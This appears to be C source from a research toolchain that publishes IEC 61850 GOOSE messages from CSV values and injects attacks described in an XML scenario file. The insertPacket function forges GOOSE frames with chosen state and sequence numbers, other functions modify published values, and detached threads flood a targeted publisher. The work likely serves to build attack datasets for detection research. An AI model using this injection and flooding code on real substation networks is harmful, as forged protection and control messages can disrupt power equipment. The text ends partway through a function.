/*
 * goose_publisher_example.c
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/time.h>
#include "goose_publisher_toolchain.h"
#include <unistd.h>
#include "ied_server_private.h"
#include "mms_goose.h"
#include "../src/iec61850/server/mms_mapping/mms_goose.c"
#include <pthread.h>
#include <time.h>

#define CSVFILENAME "value.csv"
#define ATTACKSCENARIOXML "AttackScenarioConfiguration.xml"
#define DEBUG_MODE 0
#define CSV_DT 1.0
#define GOOSE_MIN_MS 10
#define GOOSE_MAX_MS 2000
#define GOOSE_HEARTBEAT_S 2.0


/* import IEC 61850 device model created from SCL-File */
extern IedModel iedModel;
static IedServer iedServer = NULL;

typedef struct {
    IedServer s;
    char needle[16];
} BurstJob;

static void* burst_thread_fn(void* arg);
static void launch_burst_async(IedServer s, const char* needle);


/* -------------------- ADDED: forward declarations -------------------- */
static void sleep_seconds(double s);
static void publish_all_goose_once(IedServer s);
static void burstPublishByGoCbRefContains(IedServer iedserver,
                                         const char* needle,
                                         LinkedList dataSetValues);

static void burstCTRL(IedServer s, LinkedList vals);
static void burstPROT(IedServer s, LinkedList vals);
static void burstMEAS(IedServer s, LinkedList vals);

static void updateStNumByGoCbRefContains(IedServer iedserver, const char* needle);
void updateStNumCTRL(IedServer iedserver);
void updateStNumPROT(IedServer iedserver);
void updateStNumMEAS(IedServer iedserver);
void MmsGooseControlBlock_observedObjectChanged(MmsGooseControlBlock self);
static void select_goose_times_from_ref(const char* ref, uint32_t* min_ms, uint32_t* max_ms);
/* ------------------ END ADDED: forward declarations ------------------ */


bool enableInsertAttack=true;
bool enableModifyAttack=true;
bool enableDosAttack=true;
int executedInsertAttackCount=0;
int executedModifyAttackCount=0;
int executedDosAttackCount=0;
double updatePayloadInterval;
struct AttackList* attackList;
clock_t beginTime;
struct timeval beginTime2;
bool firstPublishGoose=true;
char **results;
static double g_sim_time = 0.0;


// has to be executed as root!
int main(int argc, char **argv) {
	char *interface;
	//double nextUpdatePayloadTime=getTime()+1;
	double nextUpdatePayloadTime;
	int port;
	char *folder;
    double programDuration;
    //printf("max time is %d\n", iedModel.gseCBs->maxTime);
    //printf("min time is %d\n", iedModel.gseCBs->minTime);
	updatePayloadInterval = GOOSE_HEARTBEAT_S; /* seconds */
	printf("initial heartbeat updatePayloadInterval=%.3f s\n", updatePayloadInterval);



    //printf("updatePayloadInterval is %f\n", updatePayloadInterval);

	if (argc > 2) {
		if (DEBUG_MODE) {
			 interface = "veth1.2";
			 nextUpdatePayloadTime = getTime() + 1;
			 port = 102;
			 folder = "dummy";
			 programDuration=30;
		} else {
			interface = argv[1];
			nextUpdatePayloadTime = atof(argv[2]);
			port = atoi(argv[3]);
			folder = argv[4];
			programDuration=atof(argv[5]);

		}
		//printf("c time is %.3f", getTime());
	} else {
		printf("Use as: sudo ./goose_publisher_toolchain interfaceID currentTimestamp folderName duration");
	}
	printf("Using interface %s\n", interface);
	
	/* ADDED: seed RNG for timing jitter */
	srand((unsigned)time(NULL));

	beginTime = clock();

	/* ---- FORCE GOOSE retransmission window (all GCBs): min=10ms, max=2000ms ---- */
	// for (GSEControlBlock* gcb = iedModel.gseCBs;
	// 	gcb != NULL;
	// 	gcb = gcb->sibling)
	// {
	// 	gcb->minTime = GOOSE_MIN_MS;  /* 10 ms */
	// 	gcb->maxTime = GOOSE_MAX_MS;  /* 2000 ms */
	// }

	/* Heartbeat interval (baseline publish_all_goose_once) */
	updatePayloadInterval = GOOSE_HEARTBEAT_S;


	// printf("OVERRIDE minTime=%d ms maxTime=%d ms heartbeat=%.3f s\n",
	// 	iedModel.gseCBs->minTime, iedModel.gseCBs->maxTime, updatePayloadInterval);


	/* Now create server AFTER override */
	iedServer = IedServer_create(&iedModel);

	IedServer_setGooseInterfaceId(iedServer, interface);
	IedServer_start(iedServer, port);
	if (!IedServer_isRunning(iedServer)) {
		printf("Starting server failed! Exit.\n");
		IedServer_destroy(iedServer);
		exit(-1);
	}


	/* Start GOOSE publishing */
	IedServer_enableGoosePublishing(iedServer);   /* initializes publishers in your build */
	// IedServer_disableGoosePublishing(iedServer);  /* stops the internal periodic sender */
	LinkedList e = iedServer->mmsMapping->gseControls;
	int n=0, npub=0, nvals=0;
	while ((e = LinkedList_getNext(e)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock)e->data;

		printf("GCB name=%s goCBRef=%s", gcb->name, gcb->goCBRef);

		uint32_t min_ms, max_ms;
		select_goose_times_from_ref(gcb->goCBRef, &min_ms, &max_ms);

		gcb->minTime = (int)min_ms;
		gcb->maxTime = (int)max_ms;

		MmsValue_setUint32(MmsValue_getElement(gcb->mmsValue, 6), min_ms);
		MmsValue_setUint32(MmsValue_getElement(gcb->mmsValue, 7), max_ms);

		printf(" -> Tmin=%u ms Tmax=%u ms\n", min_ms, max_ms);
	}
	printf("GCBs=%d publishers=%d datasetValues=%d\n", n, npub, nvals);

	/*prepare "value csv file" and "attack scenario file" reading*/
	FILE *valueFileStream;
	char attackFileName[100];

	if (DEBUG_MODE) {
		valueFileStream = fopen(CSVFILENAME, "r");
		strcpy(attackFileName,ATTACKSCENARIOXML);
	} else {
		char valueFileName[100];
		strcpy(valueFileName, folder);
		strcat(valueFileName, "/");
		strcat(valueFileName, CSVFILENAME);
		valueFileStream = fopen(valueFileName, "r");

		strcpy(attackFileName,folder);
		strcat(attackFileName,"/");
		strcat(attackFileName,ATTACKSCENARIOXML);
	}


	char cwd[100];
	if (getcwd(cwd, sizeof(cwd)) != NULL) {
		printf("Current working dir: %s\n", cwd);
	}
	if (valueFileStream == NULL) {
		printf("Cannot load csv file.\n");
		exit(-1);

	}

	// Read attack infor from xml file.
    attackList=getAttackList(attackFileName);



	char *buffer;
	size_t bufsize = 1024;
	size_t characters;
	buffer = (char*) malloc(bufsize * sizeof(char));
	int lineSize = 0;

	//update packets value basing on csv file.
	int running = 1;
	char **lastResult;
	char * lastBuffer;
	lastBuffer=(char*) malloc(bufsize * sizeof(char));
	beginTime= clock();
	gettimeofday(&beginTime2, NULL);
	printf("start time is %f\n", getRuningTime());
	while (getRuningTime() < programDuration) {
		//printf("iterate time is %f\n",getRuningTime());
		lineSize = getline(&buffer, &bufsize, valueFileStream);
		if (lineSize != -1) { //read a new line from csv
			char *tmp = strdup(buffer);
			results = getfield(tmp);
			/* ADDED: track which stream changed this CSV step */
			int ctrl_changed = 0;
			int prot_changed = 0;
			int meas_changed = 0;
			if(firstPublishGoose){//if this is the first time loop , no need to update St Sq number.
				firstPublishGoose=false;
				strcpy(lastBuffer, buffer);
			}else{ 

				// Cache last values per stream (persist across loop iterations)
				static int inited = 0;
				static char lastCTRL[4][64];
				static char lastPROT[5][64];
				static char lastMEAS[10][64];

				// safe copy helper
				#define CPY(dst, src) do { \
					const char* _s = (src) ? (src) : ""; \
					strncpy((dst), _s, sizeof(dst)-1); \
					(dst)[sizeof(dst)-1] = '\0'; \
				} while(0)

				if (!inited) {
					// initialize cache
					for (int i = 0; i < 4;  i++) CPY(lastCTRL[i], results[i]);
					for (int i = 0; i < 5;  i++) CPY(lastPROT[i], results[4 + i]);
					for (int i = 0; i < 10; i++) CPY(lastMEAS[i], results[9 + i]);
					inited = 1;
				} else {
					// CTRL: columns 0..3
					for (int i = 0; i < 4; i++) {
						const char* cur = results[i] ? results[i] : "";
						if (strcmp(cur, lastCTRL[i]) != 0) { ctrl_changed = 1; break; }
					}

					// PROT: columns 4..8
					for (int i = 0; i < 5; i++) {
						const char* cur = results[4 + i] ? results[4 + i] : "";
						if (strcmp(cur, lastPROT[i]) != 0) { prot_changed = 1; break; }
					}

					// MEAS: columns 9..18
					for (int i = 0; i < 10; i++) {
						const char* cur = results[9 + i] ? results[9 + i] : "";
						if (strcmp(cur, lastMEAS[i]) != 0) { meas_changed = 1; break; }
					}

					// Update stNum ONLY for streams that changed
					if (ctrl_changed) updateStNumCTRL(iedServer);
					if (prot_changed) updateStNumPROT(iedServer);
					if (meas_changed) updateStNumMEAS(iedServer);

					// refresh cache
					for (int i = 0; i < 4;  i++) CPY(lastCTRL[i], results[i]);
					for (int i = 0; i < 5;  i++) CPY(lastPROT[i], results[4 + i]);
					for (int i = 0; i < 10; i++) CPY(lastMEAS[i], results[9 + i]);
				}

				// keep your existing lastBuffer behavior
				strcpy(lastBuffer, buffer);

				#undef CPY
			}
			//launch modify attack
			if(enableModifyAttack){
				launchModifyAttack(iedServer,results);
			}


			assignPayloadValue();

			/* Trigger GOOSE bursts by stNum change (internal publisher handles min/max timing) */
			// if (ctrl_changed) launch_burst_async(iedServer, "CTRL/");
			// if (prot_changed) launch_burst_async(iedServer, "PROT/");
			// if (meas_changed) launch_burst_async(iedServer, "MEAS/");

			/* ADDED: occasional benign microbursts (even without stNum changes)
				Very low probability per loop iteration */
			// double p_micro = 0.02; // 2% chance each CSV step
			// double u = (double)rand() / (double)RAND_MAX;

			// if (u < p_micro) {
			// 	int pick = rand() % 3;
			// 	if (pick == 0) burstCTRL(iedServer, NULL);
			// 	else if (pick == 1) burstPROT(iedServer, NULL);
			// 	else burstMEAS(iedServer, NULL);
			// }
			/*while (1) {
					if (getTime() > nextUpdatePayloadTime) {
						nextUpdatePayloadTime = nextUpdatePayloadTime + updatePayloadInterval;
						break;
					}
			}*/
			/* Keep CSV pace: 1 row = 1 second */
			printf("loop sim_t=%.0f ctrl=%d prot=%d meas=%d\n", g_sim_time, ctrl_changed, prot_changed, meas_changed);
			sleep_seconds(CSV_DT);
			g_sim_time += CSV_DT;



			InsertAndDoSAttacks();

			free(tmp);
			free(results);
		}else{
			IedServer_disableGoosePublishing(iedServer);
			IedServer_stop(iedServer);
			IedServer_destroy(iedServer);
			iedServer = NULL;

			fclose(valueFileStream);

			free(buffer);
			free(lastBuffer);
			// sleep((int)updatePayloadInterval);
		}
	}
	printf("running time is %f\n",getRuningTime());
	exit(0);

}

static const char* _skip_ws(const char* s)
{
    if (!s) return NULL;
    while (*s == ' ' || *s == '\t' || *s == '\n' || *s == '\r') s++;
    return s;
}

static void _trim_copy(char* dst, size_t dst_sz, const char* src)
{
    if (!dst || dst_sz == 0) return;
    dst[0] = '\0';
    if (!src) return;

    src = _skip_ws(src);

    size_t n = strlen(src);
    while (n > 0) {
        char c = src[n - 1];
        if (c == ' ' || c == '\t' || c == '\n' || c == '\r') n--;
        else break;
    }

    if (n >= dst_sz) n = dst_sz - 1;
    memcpy(dst, src, n);
    dst[n] = '\0';
}

static int _ref_equiv(const char* a, const char* b)
{
    if (!a || !b) return 0;

    /* exact match */
    if (strcmp(a, b) == 0) return 1;

    /* tolerate minor formatting differences by substring containment */
    if (strstr(a, b) != NULL) return 1;
    if (strstr(b, a) != NULL) return 1;

    return 0;
}

static GoosePublisher find_legit_publisher_for_attack(const struct DosAttack* a)
{
    if (!a) return NULL;
    if (!iedServer || !iedServer->mmsMapping || !iedServer->mmsMapping->gseControls)
        return NULL;

    /* Trim XML strings once to avoid hidden whitespace breaking strcmp */
    char want_gocbref[256];
    char want_condgcb[128];
    _trim_copy(want_gocbref, sizeof(want_gocbref), a->gocbRef);
    _trim_copy(want_condgcb, sizeof(want_condgcb), a->condition_gcb);

    /* 1) Prefer goCBRef match (most reliable across CTRL/PROT/MEAS) */
    if (want_gocbref[0]) {
        LinkedList e = iedServer->mmsMapping->gseControls;
        while ((e = LinkedList_getNext(e)) != NULL) {
            MmsGooseControlBlock gcb = (MmsGooseControlBlock)e->data;
            if (!gcb || !gcb->publisher || !gcb->goCBRef) continue;

            if (_ref_equiv(gcb->goCBRef, want_gocbref))
                return gcb->publisher;
        }
    }

    /* 2) Fallback: match by GCB name (condition_gcb) */
    if (want_condgcb[0]) {
        LinkedList e = iedServer->mmsMapping->gseControls;
        while ((e = LinkedList_getNext(e)) != NULL) {
            MmsGooseControlBlock gcb = (MmsGooseControlBlock)e->data;
            if (!gcb || !gcb->publisher || !gcb->name) continue;

            if (strcmp(gcb->name, want_condgcb) == 0)
                return gcb->publisher;
        }
    }

    return NULL;
}

bool stobool(const char *value) {
	if (strcmp(value, "True") == 0 || strcmp(value, "TRUE") == 0
			|| strcmp(value, "true") == 0 || strcmp(value, "T") == 0) {
		return true;
	} else if (strcmp(value, "False") == 0 || strcmp(value, "FALSE") == 0
			|| strcmp(value, "false") == 0 || strcmp(value, "F") == 0) {
		return false;
	}
	printf("invalid true/false input: %s, return false \n", value);
	return false;
}

char** getfield(char *line) {
    char delim[] = ",";
    char **results = (char**) malloc(sizeof(char*) * 32);
    int i = 0;

    char *ptr = strtok(line, delim);
    while (ptr != NULL && i < 31) {
        results[i++] = ptr;
        ptr = strtok(NULL, delim);
    }
    results[i] = NULL; // terminate
    return results;
}

double getTime() {
	// to control time in millionsecond
	struct timeval start;
	double secs = 0;
	gettimeofday(&start, NULL);
	secs = (float) start.tv_usec / 1000000;
	secs += start.tv_sec;

	printf("testing secs is  %d\n",secs);


        //clock_t currentTime = clock();
        //double secsnew =(double)currentTime/ (double)100000;
        //printf("testing secs new is  %d\n",secsnew);
	return secs;
}

/* -------------------- TIMING + BURST HELPERS (IMPROVED) -------------------- */
// static void publish_all_goose_once(IedServer s)
// {
//     LinkedList element = s->mmsMapping->gseControls;

//     while ((element = LinkedList_getNext(element)) != NULL) {
//         MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
//         if (gcb && gcb->publisher && gcb->dataSetValues) {
//             GoosePublisher_publish(gcb->publisher, gcb->dataSetValues);
//         }
//     }
// }
static double clamp_double(double x, double lo, double hi)
{
    if (x < lo) return lo;
    if (x > hi) return hi;
    return x;
}

/* uniform in [a,b] */
static double rand_uniform(double a, double b)
{
    double u = (double)rand() / (double)RAND_MAX;
    return a + (b - a) * u;
}

/* Apply ±jitter_pct jitter, but keep inside [lo, hi] */
static double jittered(double x, double jitter_pct, double lo, double hi)
{
    double r = rand_uniform(-1.0, 1.0);
    double y = x * (1.0 + jitter_pct * r);
    return clamp_double(y, lo, hi);
}

static void sleep_seconds(double s)
{
    if (s <= 0) return;

    struct timespec ts;
    ts.tv_sec  = (time_t)s;
    ts.tv_nsec = (long)((s - (double)ts.tv_sec) * 1e9);

    /* nanosleep can be interrupted; loop until done */
    while (nanosleep(&ts, &ts) == -1) {
        continue;
    }
}

/* --- DoS pacing helpers (ns resolution) --- */
static inline long long now_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);  /* use REALTIME to avoid CLOCK_MONOTONIC issues */
    return (long long)ts.tv_sec * 1000000000LL + (long long)ts.tv_nsec;
}

static inline void wait_until_ns(long long target_ns)
{
    for (;;) {
        long long now = now_ns();
        long long diff = target_ns - now;

        if (diff <= 0)
            return;

        /* If we're far away, sleep most of it to avoid burning CPU */
        if (diff > 2000000LL) { /* > 2 ms */
            struct timespec ts;
            ts.tv_sec = (time_t)(diff / 1000000000LL);
            ts.tv_nsec = (long)(diff % 1000000000LL);

            /* wake up a little early, then refine below */
            if (ts.tv_nsec > 1000000L) ts.tv_nsec -= 1000000L; /* 1 ms */
            else if (ts.tv_sec > 0) { ts.tv_sec -= 1; ts.tv_nsec += 999000000L; }

            nanosleep(&ts, NULL);
            continue;
        }

        /* If we're close (<2 ms), yield/sleep very briefly to reduce jitter */
        if (diff > 200000LL) { /* 0.2 ms */
            struct timespec ts = { .tv_sec = 0, .tv_nsec = 100000L }; /* 0.1 ms */
            nanosleep(&ts, NULL);
            continue;
        }

        /* Final tiny remainder: short spin for accuracy */
        while (now_ns() < target_ns) { /* tight spin */ }
        return;
    }
}


static void select_goose_times_from_ref(const char* ref, uint32_t* min_ms, uint32_t* max_ms)
{
    /* Safe fallback */
    *min_ms = 10;
    *max_ms = 2000;

    if (ref == NULL)
        return;

    if (strstr(ref, "PROT") != NULL) {
        *min_ms = 10;
        *max_ms = 2000;
    }
    else if (strstr(ref, "CTRL") != NULL) {
        *min_ms = 10;
        *max_ms = 4000;
    }
    else if (strstr(ref, "MEAS") != NULL) {
        *min_ms = 20;
        *max_ms = 8000;
    }
}

/* ---- FORCE TTL for all normal GCB publishers ---- */
void set_ttl_all_gcb_publishers(IedServer s, int ttl_ms)
{
    if (!s || !s->mmsMapping || !s->mmsMapping->gseControls)
        return;

    LinkedList e = s->mmsMapping->gseControls;

    while ((e = LinkedList_getNext(e)) != NULL) {
        MmsGooseControlBlock gcb = (MmsGooseControlBlock)e->data;
        if (gcb && gcb->publisher) {
            GoosePublisher_setTimeAllowedToLive(gcb->publisher, ttl_ms);
            printf("TTL=%d ms set for %s\n", ttl_ms, gcb->goCBRef);
        }
    }
}

static void* burst_thread_fn(void* arg)
{
    BurstJob* job = (BurstJob*)arg;
    if (!job) return NULL;

    /* IMPORTANT: lock while publishing to avoid racing assignPayloadValue() */
    // IedServer_lockDataModel(job->s);
    burstPublishByGoCbRefContains(job->s, job->needle, NULL);
    // IedServer_unlockDataModel(job->s);

    free(job);
    return NULL;
}

static void launch_burst_async(IedServer s, const char* needle)
{
    BurstJob* job = (BurstJob*)malloc(sizeof(BurstJob));
    if (!job) return;

    job->s = s;
    strncpy(job->needle, needle, sizeof(job->needle) - 1);
    job->needle[sizeof(job->needle) - 1] = '\0';

    pthread_t tid;
    if (pthread_create(&tid, NULL, burst_thread_fn, job) == 0) {
        pthread_detach(tid); /* don’t block CSV loop */
    } else {
        free(job);
    }
}

static void publish_all_goose_once(IedServer s)
{
    if (!s || !s->mmsMapping || !s->mmsMapping->gseControls)
        return;

    LinkedList element = s->mmsMapping->gseControls;

    while ((element = LinkedList_getNext(element)) != NULL) {
        MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
        if (gcb && gcb->publisher && gcb->dataSetValues) {
            GoosePublisher_publish(gcb->publisher, gcb->dataSetValues);
        }
    }
}

static void burstPublishByGoCbRefContains(IedServer iedserver,
                                         const char* needle,
                                         LinkedList dataSetValues)
{
	if (!iedserver || !iedserver->mmsMapping || !iedserver->mmsMapping->gseControls)
    return;
    /* Jitter settings (tune to taste) */
    const double jitter_pct = 0.08; /* ±8% */

    LinkedList element = iedserver->mmsMapping->gseControls;

    while ((element = LinkedList_getNext(element)) != NULL) {

        MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
        GoosePublisher publisher = gcb->publisher;
        const char* gocbRef = gcb->goCBRef;

        if (!(gocbRef && strstr(gocbRef, needle)))
            continue;

        /* -------- dataset values (never publish NULL) -------- */
        LinkedList vals = dataSetValues;
        if (vals == NULL)
            vals = gcb->dataSetValues;   /* this is the usual place */
		if (vals == NULL) {
			printf("BURST SKIPPED: vals NULL for gocbRef=%s\n", gocbRef);
			continue;
		}

        /* -------- min/max time (prefer per-GCB if available) --------
           In SCL you had: unit="s" multiplier="m" -> milliseconds.
           libiec61850 typically stores these as milliseconds (int). */
        int min_ms = 0;
        int max_ms = 0;

        /* If your struct has these fields, use them (many builds do) */
        /* Try uncommenting if it compiles in your tree:
           min_ms = gcb->minTime;
           max_ms = gcb->maxTime;
        */

        /* Fallback to global gseCB defaults in the generated model */
        if (min_ms <= 0) min_ms = iedModel.gseCBs->minTime;
        if (max_ms <= 0) max_ms = iedModel.gseCBs->maxTime;

        /* Safety fallbacks */
        if (min_ms <= 0) min_ms = 10;     /* 10 ms */
        if (max_ms <= 0) max_ms = 2000;   /* 2000 ms */
        if (max_ms < min_ms) max_ms = min_ms;

        double min_s = ((double)min_ms) / 1000.0;
        double max_s = ((double)max_ms) / 1000.0;

        /* -------- ramp schedule after stNum change --------
           immediate publish + exponential backoff to MaxTime */
        IedServer_lockDataModel(iedserver);
		GoosePublisher_publish(publisher, vals);
		IedServer_unlockDataModel(iedserver);

        double dt = min_s;

        /* publish at min, 2*min, 4*min, ... capped at max */
        while (dt < max_s) {
            double sleep_s = jittered(dt, jitter_pct, 0.0, max_s);
            sleep_seconds(sleep_s);
            GoosePublisher_publish(publisher, vals);
            dt *= 2.0;
        }

        /* Ensure we also hit MaxTime once (common in traces) */
        {
            double sleep_s = jittered(max_s, jitter_pct, 0.0, max_s);
            sleep_seconds(sleep_s);
            GoosePublisher_publish(publisher, vals);
        }

        /* NOTE:
           After this burst, you typically want the *regular* publisher loop
           to keep sending at ~MaxTime until the next stNum change.
           Don’t also “manually” publish this same GCB at some other cadence,
           or you’ll get weird interarrivals. */
    }
}


static void burstCTRL(IedServer s, LinkedList vals) { burstPublishByGoCbRefContains(s, "CTRL/", vals); }
static void burstPROT(IedServer s, LinkedList vals) { burstPublishByGoCbRefContains(s, "PROT/", vals); }
static void burstMEAS(IedServer s, LinkedList vals) { burstPublishByGoCbRefContains(s, "MEAS/", vals); }

/* ------------------ END TIMING + BURST HELPERS (IMPROVED) ------------------ */



static void updateStNumByGoCbRefContains(IedServer iedserver, const char* needle)
{
    if (!iedserver || !iedserver->mmsMapping || !iedserver->mmsMapping->gseControls)
        return;

    LinkedList element = iedserver->mmsMapping->gseControls;

    while ((element = LinkedList_getNext(element)) != NULL) {
        MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
        const char* gocbRef = gcb->goCBRef;

        if (gocbRef && strstr(gocbRef, needle)) {
            MmsGooseControlBlock_observedObjectChanged(gcb);
        }
    }
}


void updateStNumCTRL(IedServer iedserver) { updateStNumByGoCbRefContains(iedserver, "CTRL/"); }
void updateStNumPROT(IedServer iedserver) { updateStNumByGoCbRefContains(iedserver, "PROT/"); }
void updateStNumMEAS(IedServer iedserver) { updateStNumByGoCbRefContains(iedserver, "MEAS/"); }


//void launchInsertAttack(IedServer iedserver, char **results) {
void launchInsertAttack() {
	LinkedList element = iedServer->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		int index = 0;
		struct InsertAttack *currentAttack;
		if (attackList->insertAttackNum != 0) {
			while (index<attackList->insertAttackNum&&attackList->insertAttackList[index]->valid==true) {
				currentAttack = attackList->insertAttackList[index];
				if (!currentAttack->executed) {
					if (currentAttack->condition_type == CONDITION_ST_SQ_GCB) {
						if (GoosePublisher_getStNum(publisher)== currentAttack->condition_st&& (GoosePublisher_getSqNum(publisher) - 1)== currentAttack->condition_sq&& !strcmp(gcb->name,currentAttack->condition_gcb)) {
							insertPacket(currentAttack);
							attackList->insertAttackList[index]->executed =true;
							executedInsertAttackCount++;
						}
					} else if (currentAttack->condition_type == CONDITION_TIME) {
						if (getRuningTime()>= (currentAttack->condition_time)) {
							printf("try to insert Packet at %f\n",getRuningTime());
							insertPacket(currentAttack);
							attackList->insertAttackList[index]->executed =true;
							executedInsertAttackCount++;
						}
					} else if (currentAttack->condition_type== CONDITION_PAYLOAD) {
						if ((!strcmp(gcb->name, currentAttack->condition_gcb))&& payloadConditionTrigger(currentAttack->condition_payloads,results)) {
							printf("trigger insert attack by condition_payload\n");
							insertPacket(currentAttack);
							attackList->insertAttackList[index]->executed =true;
							executedInsertAttackCount++;
						}
					}
				}
				if (attackList->insertAttackNum == executedInsertAttackCount) {
					enableInsertAttack = false;
				}
				index++;
			}
		} else {
			enableInsertAttack = false;
		}
	}
}
void insertPacket(struct InsertAttack* iAttack) {

	printf("insert a packet here\n");

	LinkedList dataSetValues = LinkedList_create();
	int valueIndex=0;
	while(strlen(iAttack->values[valueIndex].value)!=0){
		struct InsertAttackValue currentValue=iAttack->values[valueIndex++];
		if(!strcmp(currentValue.type,"integer")){
			LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(atoi(currentValue.value)));
		}else if(!strcmp(currentValue.type,"string")){
			LinkedList_add(dataSetValues, MmsValue_newVisibleString(currentValue.value));
		}else if(!strcmp(currentValue.type,"boolean")){
			bool binValue=false;
			if(!strcmp(currentValue.value,"true")){
				binValue=true;
			}
			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));

		}else if(!strcmp(currentValue.type,"float")){
			LinkedList_add(dataSetValues,MmsValue_newFloat(atof(currentValue.value)));
		}
	}


	CommParameters gooseCommParameters = {0};

	gooseCommParameters.appId = iAttack->appId;
	gooseCommParameters.dstAddress[0] = getHexFromString(0,iAttack->dstAddress);
	gooseCommParameters.dstAddress[1] = getHexFromString(2,iAttack->dstAddress);
	gooseCommParameters.dstAddress[2] = getHexFromString(4,iAttack->dstAddress);
	gooseCommParameters.dstAddress[3] = getHexFromString(6,iAttack->dstAddress);
	gooseCommParameters.dstAddress[4] = getHexFromString(8,iAttack->dstAddress);
	gooseCommParameters.dstAddress[5] = getHexFromString(10,iAttack->dstAddress);
	gooseCommParameters.vlanId = iAttack->vlanId;
	gooseCommParameters.vlanPriority = iAttack->vlanPriority;;

	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,iAttack->interface);

	GoosePublisher_setStNum(publisher,iAttack->stNum);
	GoosePublisher_setSqNum(publisher,iAttack->sqNum);

	GoosePublisher_setGoCbRef(publisher,iAttack->gocbRef );
	GoosePublisher_setConfRev(publisher, 1);
	GoosePublisher_setDataSetRef(publisher, iAttack->dataSet);
	printf("publishing inserted Packet at %f\n", getRuningTime());
	if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
		printf("Error sending message!\n");
	}
	printf("**************finish inserted Packet at %f\n", getRuningTime());
	GoosePublisher_destroy(publisher);

	LinkedList_destroyDeep(dataSetValues,(LinkedListValueDeleteFunction) MmsValue_delete);

}
//void launchDoSAttack(IedServer iedserver, char **results) {
void launchDoSAttack() {
	LinkedList element = iedServer->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		int index = 0;
		struct DosAttack *currentAttack;
		if (attackList->dosAttackNum != 0) {
			while (index<attackList->dosAttackNum&&attackList->dosAttackList[index]->valid==true) {
				currentAttack = attackList->dosAttackList[index];
				printf("DOS cand: sim_t=%.0f type=%d time=%.3f st=%d sq=%d gcb=%s executed=%d\n",
				getRuningTime(),
				currentAttack->condition_type,
				currentAttack->condition_time,
				currentAttack->condition_st,
				currentAttack->condition_sq,
				currentAttack->condition_gcb,
				currentAttack->executed);
				if (!currentAttack->executed) {
					if (currentAttack->condition_type == CONDITION_ST_SQ_GCB) {
						if (GoosePublisher_getStNum(publisher)== currentAttack->condition_st
								&& GoosePublisher_getSqNum(publisher) - 1== currentAttack->condition_sq
								&& !strcmp(gcb->name,currentAttack->condition_gcb)) {
							currentAttack->legitPublisher = publisher;
							createDoSAttackThread(currentAttack);
							attackList->dosAttackList[index]->executed = true;
							executedDosAttackCount++;
						}
					} else if (currentAttack->condition_type == CONDITION_TIME) {
						if (!strcmp(gcb->name, currentAttack->condition_gcb) &&
							getRuningTime() > (currentAttack->condition_time - updatePayloadInterval)) {
							currentAttack->legitPublisher = publisher;
							createDoSAttackThread(currentAttack);
							attackList->dosAttackList[index]->executed = true;
							executedDosAttackCount++;
						}
					} else if (currentAttack->condition_type== CONDITION_PAYLOAD) {
						if ((!strcmp(gcb->name, currentAttack->condition_gcb))
								&& payloadConditionTrigger(currentAttack->condition_payloads,results)) {
							currentAttack->legitPublisher = publisher;
							createDoSAttackThread(currentAttack);
							attackList->dosAttackList[index]->executed = true;
							executedDosAttackCount++;
						}
					}
				}
				if (attackList->dosAttackNum == executedDosAttackCount) {
					enableDosAttack = false;
				}
				index++;
			}
		} else {
			enableDosAttack = false;
		}
	}
}
void createDoSAttackThread(struct DosAttack* dAttack) {
    pthread_t tid;

    // heap-copy so the thread owns its input even if attackList changes later
    struct DosAttack* copy = malloc(sizeof(struct DosAttack));
    if (!copy) return;
    *copy = *dAttack;

	if (copy->legitPublisher == NULL && (copy->stNum < 0 || copy->sqNum < 0)) {
    copy->legitPublisher = find_legit_publisher_for_attack(copy);
    printf("[DoS] copy resolved legitPublisher=%p for cond_gcb=%s gocbRef=%s\n",
           (void*)copy->legitPublisher, copy->condition_gcb, copy->gocbRef);
	}

    if (pthread_create(&tid, NULL, sendDosAttackPacket, (void*)copy) == 0) {
        pthread_detach(tid);   // <-- key change: do NOT join
    } else {
        free(copy);
    }
}

void* sendDosAttackPacket(void *dAttack)
{
    fprintf(stderr, "this is dos attack---run\n");
    fflush(stderr);

    struct DosAttack* attackPointer = (struct DosAttack*) dAttack;
    if (!attackPointer)
        pthread_exit(0);

    struct DosAttack attack = *attackPointer;
    free(attackPointer);

    fprintf(stderr,
            "[DoS] START cond_gcb='%s' goCBRef='%s' iface='%s' xml_st=%d xml_sq=%d legitPublisher=%p\n",
            (attack.condition_gcb ? attack.condition_gcb : "NULL"),
            (attack.gocbRef ? attack.gocbRef : "NULL"),
            (attack.interface ? attack.interface : "NULL"),
            attack.stNum, attack.sqNum, (void*)attack.legitPublisher);
    fflush(stderr);

    /* ---- FIX 1: Validate legitPublisher pointer. If it is not one of the real GCB publishers, discard it. ---- */
    {
        GoosePublisher validated = NULL;

        if (iedServer && iedServer->mmsMapping && iedServer->mmsMapping->gseControls) {
            LinkedList e = iedServer->mmsMapping->gseControls;
            while ((e = LinkedList_getNext(e)) != NULL) {
                MmsGooseControlBlock gcb = (MmsGooseControlBlock)e->data;
                if (gcb && gcb->publisher && (gcb->publisher == attack.legitPublisher)) {
                    validated = gcb->publisher;
                    break;
                }
            }
        }

        if (attack.legitPublisher && !validated) {
            fprintf(stderr, "[DoS] WARN: legitPublisher pointer not found among GCBs -> discarding as invalid\n");
            fflush(stderr);
            attack.legitPublisher = NULL;
        }

        if (!attack.legitPublisher && ((attack.stNum < 0) || (attack.sqNum < 0))) {
            attack.legitPublisher = find_legit_publisher_for_attack(&attack);
            fprintf(stderr, "[DoS] resolved legitPublisher=%p via find_legit_publisher_for_attack\n",
                    (void*)attack.legitPublisher);
            fflush(stderr);
        }
    }

